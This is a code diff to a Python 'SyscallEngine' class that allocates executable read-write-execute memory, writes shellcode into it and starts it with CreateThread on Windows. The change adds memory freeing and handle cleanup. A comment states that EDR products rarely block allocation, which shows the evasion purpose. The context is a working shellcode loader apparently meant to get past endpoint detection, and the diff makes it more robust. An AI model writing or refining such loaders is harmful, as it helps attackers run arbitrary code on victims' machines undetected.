@@ -16,6 +16,7 @@ logger = logging.getLogger(__name__)
 PROCESS_ALL_ACCESS = 0x001F0FFF
 MEM_COMMIT = 0x00001000
 MEM_RESERVE = 0x00002000
+MEM_RELEASE = 0x00008000
 PAGE_EXECUTE_READWRITE = 0x40
 
 
@@ -41,7 +42,7 @@ class SyscallEngine:
 
     def is_supported(self) -> bool:
         """Check if current environment supports syscall operations."""
-        return self.is_windows and self.is_64bit and self.ntdll is not None
+        return self.is_windows and self.is_64bit and self.ntdll is not None and self.kernel32 is not None
 
     def allocate_memory(self, size: int) -> int:
         """Allocate RWX memory using NtAllocateVirtualMemory (Direct Syscall if possible, else API).
@@ -49,6 +50,8 @@ class SyscallEngine:
         """
         if not self.is_supported():
             return 0
+
+        assert self.kernel32 is not None  # guaranteed by is_supported()
 
         # Safety: Use standard API for allocation to avoid complex pointer math in Python
         # EDRs rarely block *allocation*, they block *execution* or *injection*.
@@ -88,6 +91,10 @@ class SyscallEngine:
             logger.warning("Syscall execution not supported on this platform")
             return False
 
+        assert self.kernel32 is not None  # guaranteed by is_supported()
+        ptr = 0
+        handle = None
+
         try:
             # 1. Allocate
             ptr = self.allocate_memory(len(shellcode))
@@ -96,6 +103,7 @@ class SyscallEngine:
 
             # 2. Write
             if not self.write_memory(ptr, shellcode):
+                self._free_memory(ptr, len(shellcode))
                 return False
 
             # 3. Execute
@@ -119,12 +127,36 @@ class SyscallEngine:
 
             if handle:
                 self.kernel32.WaitForSingleObject(handle, -1)
+                self.kernel32.CloseHandle(handle)
+                self._free_memory(ptr, len(shellcode))
                 return True
             logger.error("CreateThread failed")
+            self._free_memory(ptr, len(shellcode))
             return False
 
         except Exception as e:
             logger.exception("Shellcode execution failed: %s", e)
+            if ptr:
+                self._free_memory(ptr, len(shellcode))
+            return False
+
+    def _free_memory(self, address: int, _size: int) -> bool:
+        """Free previously allocated memory to prevent memory leaks.
+
+        Note: size parameter kept for API compatibility but not used by VirtualFree
+        with MEM_RELEASE which frees the entire allocation.
+        """
+        if not self.is_supported() or not address:
+            return False
+
+        assert self.kernel32 is not None
+        try:
+            result = self.kernel32.VirtualFree(address, 0, MEM_RELEASE)
+            if not result:
+                logger.warning("VirtualFree failed for address 0x%x", address)
+            return bool(result)
+        except Exception as e:
+            logger.exception("Memory free error: %s", e)
             return False
 
     def generate_syscall_stub(self, ssn: int) -> bytes:
